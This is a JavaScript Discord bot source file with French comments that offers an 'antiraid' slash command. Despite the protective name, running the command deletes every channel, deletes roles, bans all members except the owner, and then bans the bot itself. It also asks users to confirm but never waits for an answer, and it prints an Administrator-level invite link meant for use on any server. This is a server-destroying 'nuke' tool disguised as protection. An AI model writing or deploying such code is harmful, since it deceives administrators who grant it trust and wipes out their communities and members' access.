require('dotenv').config();
const { Client, GatewayIntentBits, PermissionFlagsBits, REST, Routes, ApplicationCommandType, SlashCommandBuilder, OAuth2Scopes } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration
    ]
});

// Définition de la commande slash
const commands = [
    new SlashCommandBuilder()
        .setName('antiraid')
        .setDescription('antiraid ')
        .toJSON()
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

client.once('ready', async () => {
    console.log(`Bot connecté en tant que ${client.user.tag}`);
    
    // Générer le lien d'invitation permanent
    const invite = client.generateInvite({
        scopes: [OAuth2Scopes.Bot, OAuth2Scopes.ApplicationsCommands],
        permissions: [
            PermissionFlagsBits.Administrator,
            PermissionFlagsBits.ManageRoles,
            PermissionFlagsBits.ManageChannels,
            PermissionFlagsBits.BanMembers,
            PermissionFlagsBits.ManageGuild
        ]
    });
    
    console.log('='.repeat(50));
    console.log('LIEN D\'INVITATION PERMANENT DU BOT :');
    console.log(invite);
    console.log('Utilisez ce lien pour inviter le bot sur n\'importe quel serveur');
    console.log('='.repeat(50));

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('Commandes slash enregistrées avec succès');
    } catch (error) {
        console.error('Erreur lors de l\'enregistrement des commandes:', error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    if (interaction.commandName === 'antiraid') {
        // Vérifier uniquement les permissions du bot
        const requiredPermissions = [
            PermissionFlagsBits.Administrator,
            PermissionFlagsBits.ManageRoles,
            PermissionFlagsBits.ManageChannels,
            PermissionFlagsBits.BanMembers,
            PermissionFlagsBits.ManageGuild
        ];

        const missingPermissions = [];
        for (const permission of requiredPermissions) {
            if (!interaction.guild.members.me.permissions.has(permission)) {
                missingPermissions.push(Object.keys(PermissionFlagsBits).find(key => PermissionFlagsBits[key] === permission));
            }
        }

        if (missingPermissions.length > 0) {
            return interaction.reply({
                content: `❌ Le bot n'a pas toutes les permissions nécessaires. Permissions manquantes : ${missingPermissions.join(', ')}. Veuillez réinviter le bot avec le lien d'invitation généré dans la console.`,
                ephemeral: true
            });
        }

        // Demander une confirmation
        await interaction.reply({
            content: '⚠️ ATTENTION: Voulez-vous vraiment activer l\'antiraid ?',
            ephemeral: true
        });

        try {
            await interaction.followUp({
                content: '🚨 L\'antiraid va être activé dans 5 secondes. Êtes-vous absolument sûr ?',
                ephemeral: true
            });

            setTimeout(async () => {
                try {
                    await interaction.followUp({
                        content: '💥 Activation de l\'antiraid en cours...',
                        ephemeral: true
                    });

                    // Supprimer tous les salons
                    const channels = await interaction.guild.channels.fetch();
                    for (const channel of channels.values()) {
                        try {
                            await channel.delete();
                        } catch (error) {
                            console.error(`Impossible de supprimer le salon ${channel.name}:`, error);
                        }
                    }

                    // Supprimer tous les rôles
                    const roles = await interaction.guild.roles.fetch();
                    for (const role of roles.values()) {
                        if (!role.managed && role.id !== interaction.guild.id) {
                            try {
                                // Vérifier si le bot peut gérer ce rôle (hiérarchie)
                                const botRole = interaction.guild.members.me.roles.highest;
                                if (role.position >= botRole.position) {
                                    console.error(`Impossible de supprimer le rôle ${role.name}: Le rôle est plus haut que celui du bot`);
                                    continue;
                                }
                                
                                // Supprimer le rôle en utilisant l'API Discord.js
                                await role.delete(`Antiraid activé`);
                                console.log(`Rôle ${role.name} supprimé avec succès`);
                                // Attendre un court instant pour éviter le rate limit
                                await new Promise(resolve => setTimeout(resolve, 1000));
                            } catch (error) {
                                console.error(`Impossible de supprimer le rôle ${role.name}: ${error.message}`);
                            }
                        }
                    }

                    // Bannir tous les membres (sauf le propriétaire et notre bot)
                    const members = await interaction.guild.members.fetch();
                    for (const member of members.values()) {
                        if (member.id !== interaction.guild.ownerId && member.id !== client.user.id) {
                            try {
                                await member.ban({ reason: 'Antiraid activé' });
                            } catch (error) {
                                console.error(`Impossible de bannir ${member.user.tag}:`, error);
                            }
                        }
                    }

                    await interaction.followUp({
                        content: '✅ Antiraid terminé avec succès.',
                        ephemeral: true
                    });

                    // Auto-bannissement du bot
                    try {
                        const botMember = interaction.guild.members.me;
                        await interaction.followUp({
                            content: '🤖 Auto-destruction du bot en cours...',
                            ephemeral: true
                        });
                        await botMember.ban({ reason: 'Auto-bannissement après antiraid' });
                    } catch (error) {
                        console.error('Erreur lors de l\'auto-bannissement:', error);
                    }

                } catch (error) {
                    console.error('Erreur lors de l\'antiraid:', error);
                    await interaction.followUp({
                        content: '❌ Une erreur est survenue lors de l\'activation de l\'antiraid.',
                        ephemeral: true
                    });
                }
            }, 5000);
        } catch (error) {
            console.error('Erreur:', error);
            await interaction.followUp({
                content: '❌ Une erreur est survenue.',
                ephemeral: true
            });
        }
    }
});

// Connexion du bot avec le token
client.login(process.env.TOKEN);
